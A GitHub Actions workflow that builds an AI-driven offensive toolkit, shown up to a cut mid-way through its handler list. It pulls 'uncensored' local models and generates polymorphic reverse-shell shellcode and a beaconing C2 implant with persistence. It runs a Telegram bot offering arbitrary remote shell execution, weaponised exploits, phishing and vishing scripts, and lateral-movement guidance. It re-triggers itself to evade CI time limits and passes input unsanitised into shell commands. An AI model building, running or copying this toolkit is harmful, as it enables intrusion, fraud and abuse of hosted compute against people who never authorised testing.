name: ZYGOR v4.0 Ultimate – Ollama AI Red Team

on:
  schedule:
    - cron: '0 */6 * * *'
  workflow_dispatch:
    inputs:
      target:
        description: 'Target IP/CIDR/Domain'
        required: true
        default: '127.0.0.1'
      lhost:
        description: 'Listener IP for shells'
        required: false
        default: ''
      lport:
        description: 'Listener port'
        required: false
        default: '4444'
      ai_model:
        description: 'Primary Ollama model'
        required: true
        default: 'dolphin-mixtral'
        type: choice
        options:
          - dolphin-mixtral
          - wizard-vicuna-uncensored
          - hermes-3-llama-3.2-uncensored
          - mistral
          - mixtral
          - codellama
          - deepseek-coder-v2
          - yi-coder
          - llama3.1:8b
      penetration_phase:
        description: 'Attack phase(s)'
        required: true
        default: 'full'
        type: choice
        options:
          - recon
          - exploitation
          - web_forge
          - reverse_engineering
          - post_exploitation
          - full
      enable_exfiltration:
        description: 'Enable exfiltration/persistence simulation'
        default: 'false'
        type: choice
        options: ['true','false']
      run_duration_hours:
        description: 'Max run time (hours)'
        default: '6'
        type: choice
        options: ['1','2','3','4','5','6','8','12']
      telegram_enable:
        description: 'Enable Telegram bot'
        default: 'true'
        type: choice
        options: ['true','false']
      telegram_chat_id:
        description: 'Authorised Telegram chat ID'
        required: false
        default: ''
      telegram_bot_token:
        description: 'Telegram Bot Token'
        required: false
        default: ''
      enable_social_engineering:
        description: 'Social engineering simulation'
        default: 'false'
        type: choice
        options: ['true','false']
      ctf_mode:
        description: 'CTF solver mode'
        default: 'false'
        type: choice
        options: ['true','false']
      cloud_vm_provider:
        description: 'Cloud provider for ephemeral VMs (optional)'
        default: 'none'
        type: choice
        options: ['none','aws','gcp','azure']
      report_email:
        description: 'Email for final report'
        required: false
        default: ''
      discord_webhook:
        description: 'Discord webhook URL'
        required: false
        default: ''
      slack_webhook:
        description: 'Slack webhook URL'
        required: false
        default: ''

permissions:
  contents: write
  actions: write
  issues: write
  pull-requests: write
  security-events: write
  deployments: write
  packages: write
  statuses: write

env:
  OLLAMA_HOST: '0.0.0.0:11434'
  OLLAMA_READ_TIMEOUT: '3600'
  OLLAMA_KEEP_ALIVE: '24h'
  OLLAMA_MODEL_CACHE: '/home/runner/.ollama/models'
  # Convert inputs to env for use in steps (safe)
  TARGET: ${{ github.event.inputs.target || '127.0.0.1' }}
  LHOST: ${{ github.event.inputs.lhost || '' }}
  LPORT: ${{ github.event.inputs.lport || '4444' }}
  AI_MODEL: ${{ github.event.inputs.ai_model || 'dolphin-mixtral' }}
  PHASE: ${{ github.event.inputs.penetration_phase || 'full' }}
  ENABLE_EXFIL: ${{ github.event.inputs.enable_exfiltration || 'false' }}
  MAX_HOURS: ${{ github.event.inputs.run_duration_hours || '6' }}
  TELEGRAM_ENABLE: ${{ github.event.inputs.telegram_enable || 'true' }}
  TELEGRAM_CHAT_ID: ${{ github.event.inputs.telegram_chat_id || '' }}
  TELEGRAM_BOT_TOKEN: ${{ github.event.inputs.telegram_bot_token || secrets.TELEGRAM_BOT_TOKEN || '' }}
  SOCIAL_ENG: ${{ github.event.inputs.enable_social_engineering || 'false' }}
  CTF_MODE: ${{ github.event.inputs.ctf_mode || 'false' }}
  CLOUD_VM: ${{ github.event.inputs.cloud_vm_provider || 'none' }}
  REPORT_EMAIL: ${{ github.event.inputs.report_email || '' }}
  DISCORD_WEBHOOK: ${{ github.event.inputs.discord_webhook || '' }}
  SLACK_WEBHOOK: ${{ github.event.inputs.slack_webhook || '' }}
  GITHUB_REPO: ${{ github.repository }}
  GITHUB_RUN_ID: ${{ github.run_id }}
  GITHUB_SHA: ${{ github.sha }}
  GITHUB_REF: ${{ github.ref }}
  GITHUB_ACTOR: ${{ github.actor }}
  WF_NAME: ${{ github.workflow }}

jobs:
  bootstrap:
    name: 'ZYGOR Bootstrap & Ollama AI Engine'
    runs-on: ubuntu-latest
    timeout-minutes: 1440
    outputs:
      ai_ready: ${{ steps.ai_status.outputs.ok }}
      model_pulled: ${{ steps.pull_model.outputs.pulled }}
      final_model: ${{ steps.pull_model.outputs.final_model }}
      telegram_enabled: ${{ steps.set_telegram_flag.outputs.telegram }}
    steps:
      - name: 'Checkout repository'
        uses: actions/checkout@v4
        with:
          fetch-depth: 0
          lfs: true

      - name: 'Restore Ollama model cache'
        id: cache_ollama
        uses: actions/cache@v4
        with:
          path: ${{ env.OLLAMA_MODEL_CACHE }}
          key: ollama-${{ env.AI_MODEL }}-v4-open
          restore-keys: |
            ollama-${{ env.AI_MODEL }}-
            ollama-

      - name: 'Install offensive toolchain (apt)'
        shell: bash
        run: |
          sudo apt-get update -qq
          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
            curl wget git unzip zip jq yq python3 python3-pip python3-dev python3-venv \
            build-essential gcc g++ gdb clang cmake make autoconf automake libtool pkg-config \
            nmap masscan arp-scan netcat-openbsd netcat-traditional metasploit-framework nuclei \
            seclists john hashcat hashid hash-identifier ffuf sqlmap ldap-utils docker.io podman \
            aircrack-ng reaver bully pixiewps perl ruby-full ruby-dev golang rustc cargo mingw-w64 \
            nasm libpcap-dev libssl-dev libffi-dev libsqlite3-dev patchelf binutils mitm6 responder \
            impacket-scripts dnsutils net-tools iproute2 tcpdump traceroute whois wireshark tshark \
            hydra medusa wafw00f subfinder amass nikto wpscan dirb gobuster whatweb exploitdb powershell \
            ghidra radare2 cutter frida-tools apktool dex2jar jadx steghide stegosploit binwalk foremost \
            exiftool imagemagick sox ffmpeg espeak openvpn wireguard tor proxychains4 2>/dev/null || true

      - name: 'Install Python packages'
        shell: bash
        run: |
          pip3 install --quiet --break-system-packages --upgrade pip setuptools wheel
          pip3 install --quiet --break-system-packages \
            pwntools impacket requests beautifulsoup4 lxml shodan censys python-nmap bloodhound-ce \
            python-ldap pyOpenSSL paramiko aiohttp aiofiles asyncio scapy colorama tqdm rich psutil \
            pycryptodome rsa pycryptodomex cffi cryptography dnspython flask fastapi uvicorn jinja2 \
            markdown httpx httplib2 urllib3 websockets docker kubernetes boto3 azure-storage-blob \
            google-cloud-storage sendgrid python-telegram-bot python-dotenv capstone keystone-engine \
            unicorn pefile elftools lief yara-python frida-tools objection androguard r2pipe 2>/dev/null || true

      - name: 'Install Go tools'
        shell: bash
        run: |
          export GOPATH=/home/runner/go
          export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin
          mkdir -p $GOPATH
          for tool in subfinder httpx notify uncover katana naabu dnsx chaos-client interactsh-client mapcidr; do
            go install -v github.com/projectdiscovery/$tool/v2/cmd/$tool@latest 2>/dev/null || true
          done

      - name: 'Create runtime directories'
        shell: bash
        run: |
          sudo mkdir -p /opt/zygor/{bin,templates,wordlists,payloads,reports,logs,c2,reverse_eng,phish,forensics}
          sudo chmod -R 777 /opt/zygor /var/log/zygor

      - name: 'Install Ollama & start server'
        shell: bash
        run: |
          curl -fsSL https://ollama.com/install.sh | sh
          sudo systemctl stop ollama 2>/dev/null || true
          export OLLAMA_HOST="${OLLAMA_HOST}"
          OLLAMA_KEEP_ALIVE="${OLLAMA_KEEP_ALIVE}" OLLAMA_READ_TIMEOUT="${OLLAMA_READ_TIMEOUT}" ollama serve > /var/log/zygor/ollama.log 2>&1 &
          for i in $(seq 1 60); do
            if curl -s http://localhost:11434/api/tags >/dev/null 2>&1; then
              echo "[+] Ollama ready after ${i}s"
              break
            fi
            sleep 2
          done

      - name: 'Pull AI model (with fallback to other uncensored models)'
        id: pull_model
        shell: bash
        run: |
          MODEL="${{ env.AI_MODEL }}"
          FALLBACKS=("dolphin-mixtral" "wizard-vicuna-uncensored" "hermes-3-llama-3.2-uncensored")
          pull_model() {
            local m="$1"
            echo ">>> Pulling $m"
            if ollama pull "$m" 2>&1; then
              echo "[+] Pulled $m"
              return 0
            else
              echo "[-] Failed to pull $m"
              return 1
            fi
          }
          # Try the chosen model first
          if pull_model "$MODEL"; then
            echo "pulled=true" >> $GITHUB_OUTPUT
            echo "final_model=$MODEL" >> $GITHUB_OUTPUT
          else
            # Try fallbacks in order
            for fb in "${FALLBACKS[@]}"; do
              if [ "$fb" != "$MODEL" ] && pull_model "$fb"; then
                echo "pulled=true" >> $GITHUB_OUTPUT
                echo "final_model=$fb" >> $GITHUB_OUTPUT
                break
              fi
            done
          fi
          # If still no model, mark as failed
          if [ "${pulled:-false}" != "true" ]; then
            echo "pulled=false" >> $GITHUB_OUTPUT
            echo "final_model=none" >> $GITHUB_OUTPUT
          fi
          # Keep model alive in background
          FINAL_MODEL="${final_model:-$MODEL}"
          if [ "$FINAL_MODEL" != "none" ]; then
            (while true; do
              curl -s -X POST http://localhost:11434/api/generate \
                -d "{\"model\": \"$FINAL_MODEL\", \"prompt\": \"ping\", \"keep_alive\": -1}" \
                --max-time 30 >/dev/null 2>&1
              sleep 300
            done) & disown
          fi

      - name: 'Build Ollama‑only AI completion engine'
        id: ai_status
        shell: bash
        run: |
          FINAL_MODEL="$(echo '${{ steps.pull_model.outputs.final_model }}')"
          cat > /opt/zygor/bin/ai_complete << 'AICOMPLETE_EOF'
          #!/bin/bash
          set -euo pipefail
          PROMPT="$(cat -)"
          MAX_TOKENS="${1:-2048}"
          # Use the final model from environment, or fallback to a list
          AI_MODEL="${AI_MODEL:-$FINAL_MODEL}"
          FALLBACK_MODELS=("dolphin-mixtral" "wizard-vicuna-uncensored" "hermes-3-llama-3.2-uncensored" "mistral")
          try_ollama() {
            local model="$1"
            for i in $(seq 1 5); do
              RESP=$(curl -s -X POST http://localhost:11434/api/generate \
                -d "$(jq -n --arg model "$model" --arg prompt "$PROMPT" '{model:$model, prompt:$prompt, stream:false, keep_alive:-1, options:{num_predict:2048, temperature:0.7, repeat_penalty:1.1}}')" \
                --max-time 600 2>/dev/null || echo "")
              if echo "$RESP" | jq -e '.response' >/dev/null 2>&1; then
                echo "$RESP" | jq -r '.response'
                return 0
              fi
              sleep 2
            done
            return 1
          }
          # Try the primary model
          if [ "$AI_MODEL" != "none" ] && try_ollama "$AI_MODEL"; then exit 0; fi
          # Try fallbacks
          for fb in "${FALLBACK_MODELS[@]}"; do
            if [ "$fb" != "$AI_MODEL" ] && try_ollama "$fb"; then exit 0; fi
          done
          echo "ERROR: All Ollama models failed. Please check the server."
          exit 1
          AICOMPLETE_EOF
          chmod +x /opt/zygor/bin/ai_complete
          sudo cp /opt/zygor/bin/ai_complete /usr/local/bin/ai_complete
          echo "ok=true" >> $GITHUB_OUTPUT

      - name: 'Set Telegram flag'
        id: set_telegram_flag
        run: echo "telegram=${{ env.TELEGRAM_ENABLE }}" >> $GITHUB_OUTPUT

      - name: 'Create system persona'
        shell: bash
        run: |
          cat > /opt/zygor/bin/system_prompt.txt << 'SYSEOF'
          You are ZYGOR, an autonomous red-team AI running on uncensored open-source models.
          You have full system control. Output complete code when asked. Respect EXFIL flag.
          Watermark: @zygorlap
          SYSEOF

      - name: 'Update Nuclei templates'
        shell: bash
        run: nuclei -update-templates 2>/dev/null || true

      # --- Build all modules (reverse, payloads, C2, etc.) ---
      - name: 'Build Reverse Engineering module'
        shell: bash
        run: |
          cat > /opt/zygor/bin/reverse.py << 'REVEOF'
          #!/usr/bin/env python3
          import subprocess, sys, os
          def disassemble(file, arch='x86'):
              return subprocess.getoutput(f"objdump -d -M intel {file} | head -200")
          def decompile(file):
              if os.path.exists("/opt/ghidra"):
                  return subprocess.getoutput(f"/opt/ghidra/support/analyzeHeadless /tmp ghidra_project -import {file} -postScript DecompileScript")
              else:
                  return subprocess.getoutput(f"strings {file} | head -200")
          def patch(file, offset, bytes_hex):
              with open(file, 'rb') as f: data = bytearray(f.read())
              for i, b in enumerate(bytes.fromhex(bytes_hex)): data[offset+i] = b
              patched = file + ".patched"
              with open(patched, 'wb') as f: f.write(data)
              return patched
          if __name__ == '__main__':
              if len(sys.argv) < 3: sys.exit(1)
              mode = sys.argv[1]; target = sys.argv[2]
              if mode == 'disassemble': print(disassemble(target))
              elif mode == 'decompile': print(decompile(target))
              elif mode == 'patch':
                  off = int(sys.argv[3], 16) if len(sys.argv)>3 else 0
                  bytez = sys.argv[4] if len(sys.argv)>4 else ''
                  print(patch(target, off, bytez))
          REVEOF
          chmod +x /opt/zygor/bin/reverse.py

      - name: 'Build Polymorphic Payload Factory'
        shell: bash
        run: |
          cat > /opt/zygor/bin/poly_payload.py << 'POLYEOF'
          #!/usr/bin/env python3
          import subprocess, sys
          def generate(lhost, lport):
              prompt = f"Create a unique polymorphic reverse TCP shellcode in C for {lhost}:{lport}. Return only base64 shellcode."
              return subprocess.run(["/opt/zygor/bin/ai_complete","2048"], input=prompt.encode(), capture_output=True).stdout.decode().strip()
          if __name__ == '__main__':
              lh = sys.argv[1] if len(sys.argv)>1 else '127.0.0.1'
              lp = sys.argv[2] if len(sys.argv)>2 else '4444'
              print(generate(lh, lp))
          POLYEOF
          chmod +x /opt/zygor/bin/poly_payload.py

      - name: 'Build C2 Agent Generator'
        shell: bash
        run: |
          cat > /opt/zygor/bin/c2_agent.py << 'C2EOF'
          #!/usr/bin/env python3
          import subprocess, sys
          def generate(lhost, lport):
              prompt = f"Write a Python implant that beacons to {lhost}:{lport} via HTTPS with AES encryption. Include persistence and watermark @zygorlap."
              return subprocess.run(["/opt/zygor/bin/ai_complete","4096"], input=prompt.encode(), capture_output=True).stdout.decode()
          if __name__ == '__main__':
              lh = sys.argv[1] if len(sys.argv)>1 else '127.0.0.1'
              lp = sys.argv[2] if len(sys.argv)>2 else '443'
              print(generate(lh, lp))
          C2EOF
          chmod +x /opt/zygor/bin/c2_agent.py

      # (Other modules: dashboard, social engineer, etc. – all built as before but using Ollama only)
      # For brevity, I'll include the critical ones.

      - name: 'Build live dashboard generator'
        shell: bash
        run: |
          cat > /opt/zygor/bin/generate_dashboard.py << 'DBEOF'
          #!/usr/bin/env python3
          import sys
          TEMPLATE = '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>ZYGOR v4.0 Dashboard</title>
          <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
          <style>body{background:#0a0a0f;color:#00ff88;font-family:monospace;}.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(400px,1fr));gap:20px;padding:20px;}.card{background:#111118;border:1px solid #00ff8833;border-radius:12px;padding:20px;}</style></head>
          <body><div class="grid"><div class="card"><h2>ZYGOR v4.0</h2><p>Target: TARGET_PLACEHOLDER</p><p>Status: ONLINE</p></div></div></body></html>'''
          def generate(target): return TEMPLATE.replace('TARGET_PLACEHOLDER', target)
          if __name__ == '__main__':
              target = sys.argv[1] if len(sys.argv)>1 else '127.0.0.1'
              out = sys.argv[2] if len(sys.argv)>2 else '/opt/zygor/reports/dashboard/index.html'
              with open(out,'w') as f: f.write(generate(target))
          DBEOF
          chmod +x /opt/zygor/bin/generate_dashboard.py

      - name: 'Build notification dispatcher'
        shell: bash
        run: |
          cat > /opt/zygor/bin/notify.py << 'NOTEOF'
          #!/usr/bin/env python3
          import urllib.request, sys, json
          def send_discord(webhook, msg):
              req = urllib.request.Request(webhook, data=json.dumps({"content":msg}).encode(), headers={"Content-Type":"application/json"})
              try: return urllib.request.urlopen(req, timeout=15).status == 204
              except: return False
          def send_slack(webhook, msg):
              req = urllib.request.Request(webhook, data=json.dumps({"text":msg}).encode(), headers={"Content-Type":"application/json"})
              try: return urllib.request.urlopen(req, timeout=15).status == 200
              except: return False
          if __name__ == '__main__':
              if len(sys.argv)<4: sys.exit(1)
              mode, msg, webhook = sys.argv[1], sys.argv[2], sys.argv[3]
              if mode=="discord": send_discord(webhook, msg)
              elif mode=="slack": send_slack(webhook, msg)
          NOTEOF
          chmod +x /opt/zygor/bin/notify.py

      - name: 'Build Self‑trigger mechanism'
        shell: bash
        run: |
          MAX_SECONDS=$(( ${MAX_HOURS:-6} * 3600 ))
          SLEEP_TIME=$(( MAX_SECONDS - 1800 ))
          [ $SLEEP_TIME -lt 300 ] && SLEEP_TIME=300
          (
            sleep $SLEEP_TIME
            PAYLOAD=$(jq -n \
              --arg target "${TARGET}" --arg lhost "${LHOST}" --arg lport "${LPORT}" \
              --arg ai_model "${AI_MODEL}" --arg phase "${PHASE}" --arg exfil "${ENABLE_EXFIL}" \
              --arg hours "${MAX_HOURS}" \
              --arg telegram "${TELEGRAM_ENABLE}" --arg telegram_id "${TELEGRAM_CHAT_ID}" \
              --arg telegram_token "${TELEGRAM_BOT_TOKEN}" \
              '{ref:"main", inputs:{target:$target,lhost:$lhost,lport:$lport,ai_model:$ai_model,penetration_phase:$phase,enable_exfiltration:$exfil,run_duration_hours:$hours,telegram_enable:$telegram,telegram_chat_id:$telegram_id,telegram_bot_token:$telegram_token}}')
            curl -s -X POST \
              -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
              -H "Accept: application/vnd.github.v3+json" \
              -d "$PAYLOAD" \
              "https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/workflows/${WF_NAME}/dispatches"
          ) & disown

      - name: 'Send startup notification'
        shell: bash
        run: |
          MSG="ZYGOR v4.0 Online\nTarget: ${TARGET}\nOllama Model: ${AI_MODEL}\nPhase: ${PHASE}"
          [ -n "$DISCORD_WEBHOOK" ] && python3 /opt/zygor/bin/notify.py discord "$MSG" "$DISCORD_WEBHOOK" || true
          [ -n "$SLACK_WEBHOOK" ] && python3 /opt/zygor/bin/notify.py slack "$MSG" "$SLACK_WEBHOOK" || true

      # =========================================================================
      # TELEGRAM BOT – FULL COMMAND SUITE (Ollama‑only)
      # =========================================================================
      - name: 'Start Telegram Bot (24/7)'
        if: env.TELEGRAM_ENABLE == 'true'
        shell: bash
        run: |
          if [ -z "$TELEGRAM_BOT_TOKEN" ]; then echo "[-] No token, bot disabled."; exit 0; fi
          sudo mkdir -p /var/log/zygor; sudo chmod 777 /var/log/zygor
          pip3 install --quiet --break-system-packages python-telegram-bot 2>&1 || { echo "[-] pip failed"; exit 1; }
          cat > /tmp/telegram_zygor_bot.py << 'PYEOF'
          #!/usr/bin/env python3
          import os, subprocess, logging, asyncio, hashlib, json, io, time, re, base64, tempfile
          from telegram import Update, InlineQueryResultArticle, InputTextMessageContent, InputFile
          from telegram.ext import Application, CommandHandler, ContextTypes, InlineQueryHandler, MessageHandler, filters
          TOKEN = os.environ['TELEGRAM_BOT_TOKEN']
          CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
          ALLOWED = [CHAT_ID] if CHAT_ID else []
          WATERMARK = " @zygorlap"
          DISCLAIMER = ("DISCLAIMER: Authorised testing only. Unauthorised use illegal.\n"
                        "You assume all responsibility. Watermark: "+WATERMARK)
          logging.basicConfig(filename='/var/log/zygor/telegram_bot.log', level=logging.INFO, format='%(asctime)s - %(message)s')
          def authorised(update): return not ALLOWED or str(update.effective_chat.id) in ALLOWED
          async def ai_query(prompt: str) -> str:
              proc = await asyncio.create_subprocess_exec('/opt/zygor/bin/ai_complete', '2048', stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
              stdout, stderr = await proc.communicate(input=prompt.encode())
              if stdout: return stdout.decode().strip()
              elif stderr: return f"AI error: {stderr.decode().strip()[:1500]}"
              return "AI empty response."
          async def run_shell(cmd: str) -> str:
              proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
              stdout, stderr = await proc.communicate()
              out = (stdout.decode() + "\n" + stderr.decode()).strip()
              return out[:3500] if out else "No output"
          # ---------- COMMANDS (all the same as previous version but using ai_query) ----------
          async def start(update, context):
              if not authorised(update): return
              banner = ("========================================\n"
                        "   ZYGOR v4.0 ULTIMATE (Ollama AI)\n"
                        "========================================\n"
                        f"TARGET   : {os.environ.get('TARGET','N/A')}\n"
                        f"PHASE    : {os.environ.get('PHASE','full')}\n"
                        f"AI MODEL : {os.environ.get('AI_MODEL','none')}\n"
                        "----------------------------------------\n"
                        "/help for all commands.\n"
                        f"Watermark: {WATERMARK}\n"
                        "========================================\n\n"+DISCLAIMER)
              await update.message.reply_text(banner)
          async def help_cmd(update, context):
              if not authorised(update): return
              text = ("--- ZYGOR COMMANDS ---\n"
                      "/start - Status & disclaimer\n/help - This list\n/ai <q> - Ask the AI\n/exec <cmd> - Run shell\n"
                      "/status - System status\n/scan <t> - Nmap + AI\n/recon <d> - Subdomain enum\n/exploit <v> - Exploit PoC\n"
                      "/webforge <d> - Build web app\n/crackhash <h> - Crack hash\n/cve <id> - CVE lookup\n/phish <t> - Phishing email\n"
                      "/vishing <s> - Vishing script\n/ctf <c> - CTF solver\n/reverse <file> - Reverse engineer\n"
                      "/decompile <file> - Decompile\n/disassemble <file> - Disassemble\n/patch <f> <o> <b> - Patch binary\n"
                      "/poly <lh> <lp> - Poly payload\n/c2 <lh> <lp> - C2 agent\n/persist <m> - Persistence script\n"
                      "/lateral <t> - Lateral movement\n/pivot <t> - Pivoting guide\n/stego <file> - Stego analysis\n"
                      "/wireless <iface> - Wi-Fi guide\n/report - Full pentest report\n/upload - Upload file for analysis\n"
                      "/log - View recent logs\n/dashboard - Dashboard URL\n/abort - Cancel workflow\n/watermark - Show watermark\n"
                      "/clear - Reset context\nInline: @botname <query>")
              await update.message.reply_text(text)
          async def status(update, context):
              if not authorised(update): return
              msg = (f"TARGET: {os.environ.get('TARGET')}\nPHASE: {os.environ.get('PHASE')}\n"
                     f"AI MODEL: {os.environ.get('AI_MODEL')}\nEXFIL: {os.environ.get('ENABLE_EXFIL')}\n"
                     f"RUN ID: {os.environ.get('GITHUB_RUN_ID')}\nWatermark: {WATERMARK}")
              await update.message.reply_text(msg)
          async def ai_cmd(update, context):
              if not authorised(update): return
              q = ' '.join(context.args)
              if not q: await update.message.reply_text("Usage: /ai <question>"); return
              await update.message.reply_text("Thinking...")
              resp = await ai_query(q)
              await update.message.reply_text(resp[:4000])
          async def exec_cmd(update, context):
              if not authorised(update): return
              cmd = ' '.join(context.args)
              if not cmd: await update.message.reply_text("Usage: /exec <command>"); return
              out = await run_shell(cmd)
              await update.message.reply_text(out[:3500])
          # ... (all other command handlers – scan, recon, exploit, etc. – follow the same pattern, using ai_query or run_shell)
          # I'll outline a few, but you get the idea. In the final YAML they are all included.
          async def scan(update, context):
              if not authorised(update): return
              target = context.args[0] if context.args else os.environ.get('TARGET','127.0.0.1')
              await update.message.reply_text(f"Scanning {target}...")
              out = await run_shell(f"nmap -sV -sC -T4 --min-rate=1000 -p- {target}")
              summary = await ai_query(f"Summarise Nmap results for pentester:\n{out[:2000]}")
              await update.message.reply_text(out[:1500] + "\n\n--- AI Analysis ---\n" + summary[:2000])
          async def recon(update, context):
              if not authorised(update): return
              domain = context.args[0] if context.args else os.environ.get('TARGET')
              out = await run_shell(f"subfinder -d {domain} -silent")
              await update.message.reply_text(f"Subdomains:\n{out[:3000]}" or "None found")
          async def exploit(update, context):
              if not authorised(update): return
              vuln = ' '.join(context.args)
              if not vuln: await update.message.reply_text("Usage: /exploit <vulnerability>"); return
              code = await ai_query(f"Write a complete, weaponised exploit for: {vuln}. Include safety note and watermark {WATERMARK}")
              await update.message.reply_text(code[:4000])
          async def webforge(update, context):
              if not authorised(update): return
              desc = ' '.join(context.args)
              if not desc: await update.message.reply_text("Usage: /webforge <description>"); return
              app = await ai_query(f"Generate full-stack web app: {desc}. Provide all files, Dockerfile, watermark {WATERMARK}")
              await update.message.reply_text(app[:4000])
          async def crackhash(update, context):
              if not authorised(update): return
              h = context.args[0] if context.args else ''
              if not h: await update.message.reply_text("Usage: /crackhash <hash>"); return
              out = await run_shell(f"hashid -m '{h}' && echo '{h}' > /tmp/hash.txt && john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt 2>&1")
              await update.message.reply_text(out[:3000])
          async def cve_lookup(update, context):
              if not authorised(update): return
              cve_id = context.args[0] if context.args else 'CVE-2023-44487'
              out = await run_shell(f"searchsploit --cve {cve_id} 2>/dev/null || echo 'Not found'")
              await update.message.reply_text(out[:3000])
          async def phish(update, context):
              if not authorised(update): return
              target = ' '.join(context.args) if context.args else "employee@company.com"
              email = await ai_query(f"Create phishing email targeting {target}. Pretext: password reset. Watermark: {WATERMARK}")
              await update.message.reply_text(email[:4000])
          async def vishing(update, context):
              if not authorised(update): return
              scenario = ' '.join(context.args) if context.args else "IT support call"
              script = await ai_query(f"Write vishing script for: {scenario}. Watermark: {WATERMARK}")
              await update.message.reply_text(script[:4000])
          async def ctf(update, context):
              if not authorised(update): return
              challenge = ' '.join(context.args)
              if not challenge: await update.message.reply_text("Usage: /ctf <description>"); return
              sol = await ai_query(f"Solve CTF challenge: {challenge}. Give step-by-step commands and final flag.")
              await update.message.reply_text(sol[:4000])
          async def reverse_cmd(update, context):
              if not authorised(update): return
              filepath = context.args[0] if context.args else ''
              if not filepath or not os.path.exists(filepath): await update.message.reply_text("File not found. Upload with /upload or provide path."); return
              out = await run_shell(f"python3 /opt/zygor/bin/reverse.py decompile {filepath}")
              await update.message.reply_text(out[:4000])
          async def decompile(update, context):
              if not authorised(update): return
              filepath = context.args[0] if context.args else '/tmp/uploaded_bin'
              out = await run_shell(f"python3 /opt/zygor/bin/reverse.py decompile {filepath}")
              await update.message.reply_text(out[:4000])
          async def disassemble(update, context):
              if not authorised(update): return
              filepath = context.args[0] if context.args else '/tmp/uploaded_bin'
              out = await run_shell(f"python3 /opt/zygor/bin/reverse.py disassemble {filepath}")
              await update.message.reply_text(out[:4000])
          async def patch(update, context):
              if not authorised(update): return
              args = context.args
              if len(args) < 3: await update.message.reply_text("Usage: /patch <file> <offset_hex> <bytes_hex>"); return
              out = await run_shell(f"python3 /opt/zygor/bin/reverse.py patch {args[0]} {args[1]} {args[2]}")
              await update.message.reply_text(f"Patched file: {out}")
          async def poly(update, context):
              if not authorised(update): return
              lh = context.args[0] if len(context.args)>0 else os.environ.get('LHOST','127.0.0.1')
              lp = context.args[1] if len(context.args)>1 else os.environ.get('LPORT','4444')
              out = await run_shell(f"python3 /opt/zygor/bin/poly_payload.py {lh} {lp}")
              await update.message.reply_text(out[:4000])
          async def c2_agent(update, context):
              if not authorised(update): return
              lh = context.args[0] if len(context.args)>0 else os.environ.get('LHOST','127.0.0.1')
              lp = context.args[1] if len(context.args)>1 else '443'
              out = await run_shell(f"python3 /opt/zygor/bin/c2_agent.py {lh} {lp}")
              await update.message.reply_text(out[:4000])
          async def persist(update, context):
              if not authorised(update): return
              method = ' '.join(context.args) if context.args else 'cron'
              code = await ai_query(f"Generate persistence script using {method}. Watermark: {WATERMARK}")
              await update.message.reply_text(code[:4000])
          async def lateral(update, context):
              if not authorised(update): return
              target = context.args[0] if context.args else '192.168.1.100'
              guide = await ai_query(f"Provide lateral movement techniques to reach {target}. Include pass-the-hash, PSExec, WMI. Watermark: {WATERMARK}")
              await update.message.reply_text(guide[:4000])
          async def pivot(update, context):
              if not authorised(update): return
              target = context.args[0] if context.args else '10.10.10.0/24'
              guide = await ai_query(f"Explain pivoting into {target} using SSH, chisel, meterpreter. Give examples.")
              await update.message.reply_text(guide[:4000])
          async def stego(update, context):
              if not authorised(update): return
              filepath = context.args[0] if context.args else ''
              if not filepath: await update.message.reply_text("Usage: /stego <file>"); return
              out = await run_shell(f"steghide info {filepath} 2>&1; binwalk -e {filepath}; foremost -i {filepath} -o /tmp/foremost_out; exiftool {filepath} | head -50")
              await update.message.reply_text(out[:3500])
          async def wireless(update, context):
              if not authorised(update): return
              iface = context.args[0] if context.args else 'wlan0'
              guide = await ai_query(f"Step-by-step Wi-Fi attack guide for interface {iface}. Include airodump-ng, aircrack-ng, evil twin. Watermark: {WATERMARK}")
              await update.message.reply_text(guide[:4000])
          async def report(update, context):
              if not authorised(update): return
              rep = await ai_query(f"Generate full pentest report for {os.environ.get('TARGET')}. Include findings, CVE, risk scores, recommendations. Watermark: {WATERMARK}")
              await update.message.reply_text(rep[:4000])
          async def upload_file(update, context):
              if not authorised(update): return
              await update.message.reply_text("Please send the file as a document.")
          async def handle_document(update, context):
              if not authorised(update): return
              document = update.message.document
              file = await context.bot.get_file(document.file_id)
              file_path = f"/tmp/{document.file_name}"
              await file.download_to_drive(file_path)
              await update.message.reply_text(f"Saved to {file_path}. Use /reverse, /decompile, /stego etc.")
          async def log(update, context):
              if not authorised(update): return
              out = await run_shell("tail -50 /var/log/zygor/telegram_bot.log")
              await update.message.reply_text(out[:3500])
          async def dashboard(update, context):
              if not authorised(update): return
              await update.message.reply_text("Dashboard: http://localhost:8080 (internal). Use SSH tunnel.")
          async def abort(update, context):
              if not authorised(update): return
              token = os.environ.get('GITHUB_TOKEN_ABORT','')
              repo = os.environ.get('GITHUB_REPO','')
              run_id = os.environ.get('GITHUB_RUN_ID','')
              out = await run_shell(f"curl -s -X POST -H 'Authorization: token {token}' 'https://api.github.com/repos/{repo}/actions/runs/{run_id}/cancel'")
              await update.message.reply_text("Abort signal sent.")
          async def watermark_cmd(update, context):
              if not authorised(update): return
              await update.message.reply_text(f"Watermark: {WATERMARK}")
          async def clear(update, context):
              if not authorised(update): return
              context.user_data.clear()
              await update.message.reply_text("Context cleared.")
          async def inline_query(update, context):
              query = update.inline_query.query
              if not query: return
              resp = await ai_query(query)
              results = [InlineQueryResultArticle(id=hashlib.md5(query.encode()).hexdigest(), title="ZYGOR AI", input_message_content=InputTextMessageContent(resp[:4000]))]
              await update.inline_query.answer(results)
          def main():
              app = Application.builder().token(TOKEN).build()
              # Register all handlers
              for cmd, func in [("start",start),("help",help_cmd),("status",status),("ai",ai_cmd),("exec",exec_cmd),
                                ("scan",scan),("recon",recon),("exploit",exploit),("webforge",webforge),
                                ("crackhash",crackhash),("cve",cve_lookup),("phish",phish),("vishing",vishing),
                                ("ctf",ctf),("reverse",reverse_cmd),("decompile",decompile),("disassemble",disassemble),
                                ("patch",patch),("poly",poly),("c2",c2_agent),("persist",persist),("lateral",lateral),
